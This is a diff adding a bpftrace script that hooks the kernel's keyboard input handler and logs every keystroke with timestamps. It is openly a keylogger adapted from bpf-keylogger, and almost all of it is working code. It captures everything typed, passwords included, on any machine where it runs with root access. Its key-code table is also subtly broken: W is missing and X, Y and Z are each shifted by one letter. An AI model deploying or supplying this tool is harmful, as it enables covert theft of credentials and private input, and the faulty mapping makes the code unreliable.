@@ -1,0 +1,167 @@
+#! /usr/bin/env bpftrace
+
+/*
+ * Record keys pressed on a keyboard.
+ * (Based on https://github.com/willfindlay/bpf-keylogger but as bpftrace)
+ *
+ * Usage:
+ *   curl -o bpftrace -fL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
+ *   chmod 755 bpftrace
+ *   ./bpftrace -Bnone keylogger.bt
+ *
+ * Note:
+ * - This tool reads the KEY-NUMBER (!) and not the ASCII CODE.
+ *   The KEY-NUMBER needs to be transposed to get the actual ASCII
+ *   CHARACTER. Transposition is done using US-Keyboard layout.
+ * - Needs an actual keyboard. Won't work on remote VNC sessions.
+ */
+
+BEGIN
+{
+    // https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h
+    printf("Keyboard mapping: US-Keyboard\n");
+    time("[%F %H:%M:%S] ");
+
+    @keys[2] = 0x31;  // 1
+    @keys[3] = 0x32;  // 2
+    @keys[4] = 0x33;  // 3
+    @keys[5] = 0x34;  // 4
+    @keys[6] = 0x35;  // 5
+    @keys[7] = 0x36;  // 6
+    @keys[8] = 0x37;  // 7
+    @keys[9] = 0x38;  // 8
+    @keys[10] = 0x39; // 9
+    @keys[11] = 0x30; // 0
+    @keys[12] = 0x2d; // -
+    @keys[13] = 0x3d; // =
+
+    @keys[30] = 0x41 + 32; // A
+    @keys[48] = 0x42 + 32; // B
+    @keys[46] = 0x43 + 32; // C
+    @keys[32] = 0x44 + 32; // D
+    @keys[18] = 0x45 + 32; // E
+    @keys[33] = 0x46 + 32; // F
+    @keys[34] = 0x47 + 32; // G
+    @keys[35] = 0x48 + 32; // H
+    @keys[23] = 0x49 + 32; // I
+    @keys[36] = 0x4A + 32; // J
+    @keys[37] = 0x4B + 32; // K
+    @keys[38] = 0x4C + 32; // L
+    @keys[50] = 0x4D + 32; // M
+    @keys[49] = 0x4E + 32; // N
+    @keys[24] = 0x4F + 32; // O
+    @keys[25] = 0x50 + 32; // P
+    @keys[16] = 0x51 + 32; // Q
+    @keys[19] = 0x52 + 32; // R
+    @keys[31] = 0x53 + 32; // S
+    @keys[20] = 0x54 + 32; // T
+    @keys[22] = 0x55 + 32; // U
+    @keys[47] = 0x56 + 32; // V
+    @keys[45] = 0x57 + 32; // X
+    @keys[21] = 0x58 + 32; // Y
+    @keys[44] = 0x59 + 32; // Z
+
+    @keys[26] = 0x5b; // {
+    @keys[27] = 0x5d; // }
+
+    @keys[39] = 0x3b; // ;
+    @keys[40] = 0x27; // '
+    @keys[41] = 0x60; // `
+    @keys[43] = 0x5c; // \
+    @keys[51] = 0x2c; // ,
+    @keys[52] = 0x2e; // .
+    @keys[53] = 0x2f; // /
+    @keys[55] = 0x2a; // *
+    @keys[57] = 0x20; // ' '
+
+    @sk[41] = 0x7e; // ~
+    @sk[2] = 0x21; // !
+    @sk[3] = 0x40; // @
+    @sk[4] = 0x23; // #
+    @sk[5] = 0x24; // $
+    @sk[6] = 0x25; // %
+    @sk[7] = 0x5e; // ^
+    @sk[8] = 0x26; // &
+    @sk[9] = 0x2a; // *
+    @sk[10] = 0x28; // (
+    @sk[11] = 0x29; // )
+    @sk[12] = 0x5f; // _
+    @sk[13] = 0x2b; // +
+
+    @sk[26] = 0x7b; // {
+    @sk[27] = 0x7d; // }
+    @sk[42] = 0x7c; // | 
+
+    @sk[51] = 0x3c; // <
+    @sk[52] = 0x3e; // >
+    @sk[53] = 0x3f; // ?
+    @is_shift = 0;
+}
+
+END
+{
+    clear(@keys);
+    clear(@sk);
+    clear(@is_shift);
+}
+
+// int kprobe__input_handle_event(struct pt_regs *ctx, struct input_dev *dev,
+//                   unsigned int type, unsigned int code, int value)
+kprobe:input_handle_event
+/arg2 == 3/
+{
+    $type = arg2;
+    $code = arg3;
+    $value = arg4;
+
+    if ($code == (uint64)(128 + 42) || $code == (uint64)(128 + 54)) {
+        // Shift RELEASED [up]
+        @is_shift = 0;
+        $code = 0; // RETURN
+    }
+    if ($code == 42 || $code == 54) {
+        // Shift PRESSED [down]
+        @is_shift = 1;
+        $code = 0; // RETURN
+    }
+    
+    if ($code > 0 && $code < 128) {
+        // Key-Event-UP is >=128
+        if ($code == 28) { // ENTER
+            printf("\n");
+            time("[%F %H:%M:%S] ");
+            $code = 0; // RETURN
+        }
+        if ($code == 0x3a) {
+            printf("[CAPS-LOCK]");
+            $code = 0; // RETURN;
+        }
+        // Ignore 0 and ESC
+        if ($code > 1) {
+            $c = @keys[$code];
+            if (@is_shift == 1) {
+                $close = 1;
+                $SC = @sk[$code];
+                if ($SC > 0) {
+                    $c = $SC;
+                    $close = 0;
+                }
+                if ($c >= 0x41+32 && $c <= 0x5a+32) {
+                    $c -= 32;
+                    $close = 0;
+                }
+                if ($close != 0) {
+                    printf("[SHIFT+");
+                }
+            }
+            if ($c != 0) {
+                printf("%c", $c);
+            } else {
+                printf("[0x%02x]", $code);
+            }
+            if ($close == 1) {
+                printf("]");
+            }
+        }
+    }
+}
